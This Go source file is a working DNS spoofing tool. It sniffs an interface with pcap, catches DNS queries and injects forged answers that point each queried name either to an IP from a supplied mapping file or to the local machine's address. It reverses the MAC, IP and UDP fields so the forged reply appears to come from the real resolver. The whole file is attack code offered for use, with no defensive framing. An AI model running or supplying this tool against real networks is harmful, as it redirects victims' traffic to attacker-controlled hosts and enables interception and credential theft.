package main

import (
	"bufio"
	"fmt"
	"log"
	"net"
	"os"
	"strings"

	"github.com/google/gopacket"
	"github.com/google/gopacket/layers"
	"github.com/google/gopacket/pcap"
)

func main() {
	var iface, fileName, pattern string
	//var record = make([]string, 0)
	for i, v := range os.Args {
		if v == "-i" {
			iface = os.Args[i+1]
			fmt.Println("Interface: ", iface)
		} else if v == "-f" {
			fileName = os.Args[i+1]
			fmt.Println("FileName ", fileName)
		} else if i > 0 && os.Args[i-1] != "-i" && os.Args[i-1] != "-f" {
			pattern = os.Args[i]
			fmt.Println("BPF filter: ", pattern)
		}
	}
	devices, err := pcap.FindAllDevs()
	if err != nil {
		log.Fatal(err)
	}
	var currDevice pcap.Interface
	var handle *pcap.Handle
	//var genericIP = 0
	dict := map[interface{}]interface{}{}
	for _, device := range devices {
		if iface == "" {
			currDevice = device
			break
		}
		if iface == device.Name {
			currDevice = device
			break
		}
	}
	if fileName != "" {
		var handle, err = os.Open(fileName)
		if err != nil {
			log.Fatal(err)
		}
		defer handle.Close()
		scanner := bufio.NewScanner(handle)
		for scanner.Scan() {
			buf := scanner.Text()
			split_buf := strings.Split(buf, " ")
			for i := range split_buf {
				if split_buf[i] != "" && i != 0 {
					dict[split_buf[i]] = split_buf[0]
				}
			}
		}
		if err := scanner.Err(); err != nil {
			fmt.Println(err)
		}
	} else {
		//get current interface's IP address
		//set as genericIP
	}
	handle, err = pcap.OpenLive(currDevice.Name, 1024, true, 30)
	if err != nil {
		log.Fatal(err)
	}
	defer handle.Close()
	handle.SetBPFFilter(pattern)

	// Use the handle as a packet source to process all packets
	packetSource := gopacket.NewPacketSource(handle, handle.LinkType())
	for packet := range packetSource.Packets() {
		dnsLayer := packet.Layer(layers.LayerTypeDNS)
		if dnsLayer != nil {
			dns, _ := dnsLayer.(*layers.DNS)
			dnsANCount := int(dns.ANCount)
			if dnsANCount == 0 && !dns.QR {
				for _, dnsQuestion := range dns.Questions {
					DnsQuery := string(dnsQuestion.Name)
					fmt.Println(string(dnsQuestion.Name))
					var reply layers.DNSResourceRecord
					reply.Type = layers.DNSTypeA
					reply.Class = layers.DNSClassIN
					//reply.TTL = 300
					if fileName != "" {
						reply.IP = net.ParseIP(fmt.Sprintf("%v", dict[DnsQuery]))
					} else {
						fmt.Println("-i not specified")
						conn, err := net.Dial("udp", "8.8.8.8:80")
						if err != nil {
							log.Fatal(err)
						}
						defer conn.Close()
						localAddr := conn.LocalAddr().(*net.UDPAddr)
						reply.IP = net.ParseIP(localAddr.String())
					}
					reply.Name = dnsQuestion.Name
					dns.QR = true
					dns.ANCount = dns.ANCount + 1
					//dns.OpCode = layers.DNSOpCodeNotify
					//dns.AA = true
					dns.Answers = append(dns.Answers, reply)
					dns.ResponseCode = layers.DNSResponseCodeNoErr
					fmt.Println(string(reply.Name))
				}

				replyBuf := gopacket.NewSerializeBuffer()
				serialOpts := gopacket.SerializeOptions{
					FixLengths:       true,
					ComputeChecksums: true,
				}
				etherLayer := packet.Layer(layers.LayerTypeEthernet)
				ethPacket, _ := etherLayer.(*layers.Ethernet)
				ether := layers.Ethernet{
					SrcMAC:       ethPacket.DstMAC,
					DstMAC:       ethPacket.SrcMAC,
					EthernetType: layers.EthernetTypeIPv4,
				}
				ipLayer := packet.Layer(layers.LayerTypeIPv4)
				ipPacket, _ := ipLayer.(*layers.IPv4)
				ip_addr := layers.IPv4{
					Version:  4,
					TTL:      64,
					SrcIP:    ipPacket.DstIP,
					DstIP:    ipPacket.SrcIP,
					Protocol: layers.IPProtocolUDP,
				}
				udpLayer := packet.Layer(layers.LayerTypeUDP)
				udpPacket, _ := udpLayer.(*layers.UDP)
				udp := layers.UDP{
					SrcPort: udpPacket.DstPort,
					DstPort: udpPacket.SrcPort,
				}
				udp.SetNetworkLayerForChecksum(&ip_addr)
				gopacket.SerializeLayers(replyBuf, serialOpts, &ether, &ip_addr, &udp, &*dns)
				finalPacket := replyBuf.Bytes()
				fmt.Println("Writing packet.....")
				if err := handle.WritePacketData(finalPacket); err != nil {
					log.Fatal(err)
				}
			}
		}
	}
}
